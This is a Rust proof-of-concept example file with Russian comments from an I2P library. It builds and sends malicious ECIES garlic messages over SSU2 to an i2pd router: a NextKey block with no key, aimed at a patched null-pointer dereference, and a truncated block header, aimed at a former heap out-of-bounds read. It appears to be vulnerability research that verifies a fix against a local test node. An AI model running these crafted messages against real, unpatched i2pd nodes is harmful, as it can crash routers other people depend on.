//! POC: garlic-сообщение роутеру i2pd с вредоносным блоком `NextKey`.
//!
//! ## Что это
//!
//! Отправляет запущенному i2pd **роутерное** ECIES-X25519-AEAD-Ratchet
//! сообщение (Noise «N», статический ключ получателя — ключ шифрования
//! из его `RouterInfo`) с блоком `NextKey` во вредоносной форме:
//! forward-ветка, флаг запроса обратного ключа снят и **самого ключа в
//! блоке нет** (`flags = 0`, `keyID = 0`, публичного ключа нет).
//!
//! Именно этот блок — триггер найденного `rotten_egg` null-deref'а в
//! `ECIESX25519AEADRatchetSession::HandleNextKey` (i2pd): в forward-ветке
//! без `REQUEST_REVERSE_KEY_FLAG` код делал
//! `m_NextReceiveRatchet->key->Agree(...)`, не проверив, что `key`
//! вообще есть. Фикс `e5621949` («chech ratchets payload size and key»)
//! добавил проверку и строку в лог:
//!
//! ```text
//! Garlic: Forward next key received, but key is not set
//! ```
//!
//! ## Куда сообщение доходит и чего в логах роутера ждать
//!
//! **Важно**: у *роутера* эта строка появиться не может, и вот почему.
//! Garlic, адресованный роутеру, проходит только два пути
//! (`RouterContext::PostGarlicMessage`, `RouterContext.cpp:1299`):
//!
//! 1. поиск по session-tag в `m_ECIESx25519Tags` — теги появляются
//!    только у сессий клиентских destination'ов, у роутера их нет;
//! 2. одноразовый Noise «N»
//!    (`RouterIncomingRatchetSession::HandleNextMessage`), который
//!    разбирает payload через `HandlePayload(..., receiveTagset = nullptr, 0)`.
//!
//! `HandleNextKey` вызывается **только** когда `receiveTagset != nullptr`
//! (`ECIESX25519AEADRatchetSession.cpp:417-420`), причём эта проверка
//! была и до фикса. Поэтому на N-пути блок `NextKey` отбивается раньше —
//! другой строкой:
//!
//! ```text
//! Garlic: Unexpected next key block          (eLogError)
//! ```
//!
//! То есть этот POC доказывает, что наше вредоносное сообщение
//! расшифровано и разобрано i2pd, и что i2pd отказался обрабатывать
//! `NextKey` (не упал) — но **не** воспроизводит null-deref: для него
//! нужна тег-сессия, т.е. клиентский destination, куда garlic приходит
//! через его inbound-туннель. См. `notes/ecies-nextkey-vuln.md`.
//!
//! ## Режимы (`variant`)
//!
//! - `nextkey` (по умолчанию) — блок `NextKey` без ключа: forward-ветка,
//!   `newKey == false`, свежий `m_NextReceiveRatchet` без ключа.
//!   На уязвимой сборке *destination'а* это и есть null-deref; на
//!   роутере — `Garlic: Unexpected next key block`.
//! - `truncated` — payload, обрывающийся на 1 байте заголовка блока
//!   (тип без `size`). До фикса `cc77898b`/`e5621949` цикл
//!   `while (offset < len)` читал `size` из-за конца буфера (heap OOB
//!   read, ловится `ASan`'ом); после фикса (`while (offset + 3 <= len)`,
//!   `if (len < 3) return`) такой хвост молча игнорируется. Это
//!   единственная часть фикса, достижимая на N-пути роутера.
//!
//! ## Запуск
//!
//! ```text
//! cargo run --example uu-i2p-poc-i2pd-nextkey -- <router.info> [host:port] [variant]
//!
//! UU_I2P_LIVE_RI=~/.local/opt/i2pd-uu/datadir/router.info \
//! UU_I2P_LIVE_SSU2=127.0.0.1:12345 \
//!     cargo run --example uu-i2p-poc-i2pd-nextkey
//! ```
//!
//! Логи тестового i2pd (у него `--loglevel=debug`) смотрим так:
//!
//! ```text
//! grep -a "Garlic" /tmp/opencode/i2pd-ssu2.log | tail
//! ```

use std::net::SocketAddr;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use tokio::net::UdpSocket;
use tokio::time::{Instant, timeout};
use tracing::{info, warn};
use tracing_subscriber::{EnvFilter, fmt};

use uu_i2p::{
    IdentHash,
    config::RouterConfig,
    crypto::{I2PX25519Keys, NoiseSymmetricState, init_noise_n_state},
    error::{I2PError, Result},
    garlic_block::{BLK_NEXT_KEY, GarlicBlock, NextKeyBlock, serialize_blocks},
    garlic_body::GarlicBody,
    i2np::I2npMessageType,
    i2np_message::I2npMessage,
    private_keys::I2PPrivateKeys,
    router_info::FullRouterInfo,
    ssu2_pool::{Ssu2Event, Ssu2Local, Ssu2Pool},
};

/// Что именно кладём в garlic-payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Variant {
    /// `NextKey` без ключа — триггер null-deref'а (нужна тег-сессия).
    NextKey,
    /// Обрыв на 1 байте заголовка блока — триггер OOB-чтения до фикса.
    Truncated,
}

impl Variant {
    fn parse(s: &str) -> Option<Self> {
        match s {
            "nextkey" => Some(Self::NextKey),
            "truncated" => Some(Self::Truncated),
            _ => None,
        }
    }
}

fn now_ms() -> u64 {
    u64::try_from(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock before epoch")
            .as_millis(),
    )
    .expect("milliseconds since epoch exceeds u64")
}

/// Payload garlic-блоков так, как его разбирает i2pd после расшифровки.
///
/// `DateTime` в начале — как в настоящих сообщениях i2pd
/// (`CreateGarlicPayload(msg, payload, datetime = true, ...)`), чтобы
/// наш payload был максимально похож на «настоящий».
fn build_payload(variant: Variant) -> Result<Vec<u8>> {
    let now_secs = u32::try_from(now_ms() / 1000).unwrap_or(u32::MAX);
    let datetime = GarlicBlock::DateTime(now_secs);

    match variant {
        Variant::NextKey => {
            // Вредоносный блок: forward-ветка (`REVERSE_KEY_FLAG` снят),
            // без запроса обратного ключа (`REQUEST_REVERSE_KEY_FLAG`
            // снят) и без публичного ключа (`KEY_PRESENT_FLAG` снят).
            // i2pd: `uint16_t keyID = bufbe16toh (buf); bool newKey =
            // flag & ECIESX25519_NEXT_KEY_REQUEST_REVERSE_KEY_FLAG;`,
            // затем `else { if (!key) { ... } }` — то, что чинит фикс.
            let malicious = NextKeyBlock::without_key(0, 0);
            serialize_blocks(&[
                datetime,
                GarlicBlock::NextKey(malicious.to_bytes()),
                GarlicBlock::Padding(16),
            ])
        }
        Variant::Truncated => {
            // Хвост из одного байта: тип блока без 2-байтового `size`.
            // До фикса цикл `while (offset < len)` читал `size` за
            // концом буфера.
            let mut payload = serialize_blocks(&[datetime])?;
            payload.push(BLK_NEXT_KEY);
            Ok(payload)
        }
    }
}

/// Оборачивает готовый payload в роутерный ECIES-X25519-AEAD-Ratchet
/// (Noise «N») так же, как i2pd `WrapECIESX25519MessageForRouter`:
///
/// ```text
///   aepk(32) || AEAD(payload)          nonce = 0, AD = h, key = ck[32..]
/// ```
///
/// Возвращает `wire` — тело I2NP `Garlic` (без 4-байтового префикса
/// длины: его добавит [`GarlicBody`]).
fn wrap_router_garlic(router_static: &[u8; 32], payload: &[u8]) -> Result<Vec<u8>> {
    let mut noise = NoiseSymmetricState::new(&[0u8; 32], &[0u8; 32], router_static);
    init_noise_n_state(&mut noise, router_static);

    let ephemeral = I2PX25519Keys::generate();
    let aepk = *ephemeral.public_key();
    noise.mix_hash(&aepk); // h = SHA256(h || aepk)
    let shared = ephemeral.agree(router_static).ok_or(I2PError::Malformed(
        "poc: x25519 agree failed (low-order key?)",
    ))?;
    noise.mix_key(&shared);

    let mut ciphertext = vec![0u8; payload.len() + 16];
    let len = noise.encrypt(payload, &mut ciphertext)?;
    ciphertext.truncate(len);

    let mut wire = Vec::with_capacity(32 + ciphertext.len());
    wire.extend_from_slice(&aepk);
    wire.extend_from_slice(&ciphertext);
    Ok(wire)
}

fn init_tracing() {
    let _ = fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .try_init();
}

/// Аргументы: `[router.info] [host:port] [nextkey|truncated]`, с оглядкой на
/// те же переменные окружения, что у живых interop-тестов.
struct Args {
    ri_path: String,
    addr_override: Option<SocketAddr>,
    variant: Variant,
}

fn parse_args() -> Args {
    let ri_path = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("UU_I2P_LIVE_RI").ok());
    let Some(ri_path) = ri_path else {
        eprintln!(
            "usage: uu-i2p-poc-i2pd-nextkey <router.info> [host:port] [nextkey|truncated]\n\
             \n\
             (или UU_I2P_LIVE_RI=/path/to/router.info, UU_I2P_LIVE_SSU2=host:port,\n\
             UU_I2P_POC_VARIANT=nextkey|truncated)"
        );
        std::process::exit(1);
    };
    let addr_override = std::env::args()
        .nth(2)
        .or_else(|| std::env::var("UU_I2P_LIVE_SSU2").ok())
        .map(|s| s.parse::<SocketAddr>().expect("host:port"));
    let variant = std::env::args()
        .nth(3)
        .or_else(|| std::env::var("UU_I2P_POC_VARIANT").ok())
        .map_or(Variant::NextKey, |s| {
            Variant::parse(&s).unwrap_or_else(|| {
                eprintln!("variant must be 'nextkey' or 'truncated', got '{s}'");
                std::process::exit(1);
            })
        });
    Args {
        ri_path,
        addr_override,
        variant,
    }
}

/// Ждёт `Established`, попутно логируя прочие события.
async fn wait_established(pool: &Ssu2Pool) -> IdentHash {
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        match timeout(remaining, pool.next_event())
            .await
            .expect("timeout waiting for Established")
            .expect("pool event")
        {
            Ssu2Event::Established { ident } => {
                println!("SSU2: Established с {}", ident.to_base64());
                return ident;
            }
            Ssu2Event::Disconnected { ident } => panic!("disconnected from {}", ident.to_base64()),
            other => info!(?other, "event (before Established)"),
        }
    }
}

/// Слушает входящие I2NP `secs` секунд: для POC достаточно факта, что сессия
/// жива и i2pd не ответил `Termination`.
async fn drain_events(pool: &Ssu2Pool, secs: u64) {
    let deadline = Instant::now() + Duration::from_secs(secs);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            break;
        }
        match timeout(remaining, pool.next_event()).await {
            Ok(Ok(Ssu2Event::Message { from, message })) => {
                println!(
                    "I2NP от {}: type={:?} msg_id={:#x} len={}",
                    from.to_base64(),
                    message.message_type(),
                    message.msg_id(),
                    message.payload().len()
                );
            }
            Ok(Ok(Ssu2Event::Disconnected { ident })) => {
                println!("i2pd закрыл сессию с {}", ident.to_base64());
                break;
            }
            Ok(Ok(other)) => info!(?other, "event"),
            Ok(Err(e)) => {
                warn!(error = %e, "pool event error");
                break;
            }
            Err(_) => break, // тишина — для POC это норма
        }
    }
}

/// Что именно должно появиться в логе i2pd и почему.
fn print_expectations(variant: Variant) {
    println!();
    println!("=== Что теперь должно быть в логе i2pd ===");
    match variant {
        Variant::NextKey => {
            println!("Garlic: Block type {BLK_NEXT_KEY} of size 3   (debug, если включён)");
            println!("Garlic: Next key                        (debug)");
            println!("Garlic: Unexpected next key block       (error)  <-- i2pd отбил блок");
            println!();
            println!("Строки из фикса e5621949 (`Garlic: Forward next key received, but key is");
            println!("not set`) здесь НЕ будет: у роутера нет тег-сессии, `HandleNextKey`");
            println!("вызывается только с `receiveTagset != nullptr`. Подробности — в шапке");
            println!("этого файла и в notes/ecies-nextkey-vuln.md.");
        }
        Variant::Truncated => {
            println!("Ничего: с фиксом (`while (offset + 3 <= len)`) хвостовой байт молча");
            println!("игнорируется. На сборке до фикса здесь будет либо");
            println!("`Garlic: Unexpected block length <мусор>` (прочитан size за концом");
            println!("буфера), либо heap-buffer-overflow под `ASan`'ом.");
        }
    }
    println!();
    println!("Лог: grep -a Garlic /tmp/opencode/i2pd-ssu2.log | tail");
}

#[tokio::main]
async fn main() {
    init_tracing();
    let Args {
        ri_path,
        addr_override,
        variant,
    } = parse_args();

    println!("=== POC: i2pd + вредоносный блок NextKey ===");
    println!("RouterInfo: {ri_path}");
    println!("Вариант:    {variant:?}");
    println!();

    // --- 1. RouterInfo получателя: hash + ключ шифрования identity ---

    let ri_bytes = std::fs::read(&ri_path).expect("read RouterInfo");
    let remote_ri = FullRouterInfo::from_buffer(&ri_bytes).expect("parse RouterInfo");
    let remote_ident = *remote_ri.ident_hash();
    let remote_static: [u8; 32] = remote_ri
        .identity()
        .encryption_public_key()
        .expect("identity encryption key")
        .try_into()
        .expect("X25519 key must be 32 bytes");
    info!(ident = %remote_ident.to_base64(), "router");
    for a in &remote_ri.body().addresses {
        info!(
            "  {} host={} port={} published={}",
            a.transport_style, a.host, a.port, a.published
        );
    }

    // --- 2. Свой сокет/ключи/RouterInfo и пул SSU2 ----------------------

    let socket = UdpSocket::bind("127.0.0.1:0").await.expect("bind udp");
    let local_addr = socket.local_addr().expect("local_addr");
    let our_static = I2PX25519Keys::generate();
    let our_intro = random_array::<32>();
    let our_iv = random_array::<16>();
    let cfg = RouterConfig::builder()
        .keys(I2PPrivateKeys::generate_default().expect("generate keys"))
        .ntcp2_keys(our_static, our_iv)
        .ssu2_intro_key(our_intro)
        .listen_ssu2_unpublished(local_addr)
        .build()
        .expect("build RouterConfig");
    let local = Ssu2Local::from_router_config(&cfg, now_ms()).expect("Ssu2Local");
    let pool = Ssu2Pool::with_socket(socket, local).expect("Ssu2Pool");

    // --- 3. Соединение и ожидание Established ---------------------------

    let ident = timeout(Duration::from_secs(20), async {
        match addr_override {
            Some(addr) => pool.connect_to(&ri_bytes, addr).await,
            None => pool.connect(&ri_bytes).await,
        }
    })
    .await
    .expect("connect timeout")
    .expect("connect failed");
    assert_eq!(ident, remote_ident, "connected to a different router");
    println!("SSU2: соединение с {} установлено", ident.to_base64());
    let ident = wait_established(&pool).await;

    // --- 4. Вредоносный garlic ------------------------------------------

    let payload = build_payload(variant).expect("build garlic payload");
    let wire = wrap_router_garlic(&remote_static, &payload).expect("wrap garlic");
    let body = GarlicBody::new(wire).to_buffer().expect("garlic body");
    let message = I2npMessage::new(I2npMessageType::Garlic, body);
    println!();
    println!(
        "Отправляю garlic: payload {} байт ({}), тело I2NP {} байт",
        payload.len(),
        match variant {
            Variant::NextKey => "DateTime + NextKey(flags=0, keyID=0, без ключа) + Padding",
            Variant::Truncated => "DateTime + обрыв на 1 байте заголовка блока",
        },
        message.total_len()
    );
    pool.send_to(&ident, message).await.expect("send garlic");

    // --- 5. Даём i2pd время обработать и смотрим, что он отвечает -------

    drain_events(&pool, 5).await;
    let _ = pool.close(&ident).await;

    // --- 6. Что смотреть в логе i2pd ------------------------------------

    print_expectations(variant);
}

/// `N` случайных байт — чтобы не тянуть `rand` в пример дважды.
fn random_array<const N: usize>() -> [u8; N] {
    let mut out = [0u8; N];
    rand::Rng::fill_bytes(&mut rand::rng(), &mut out);
    out
}
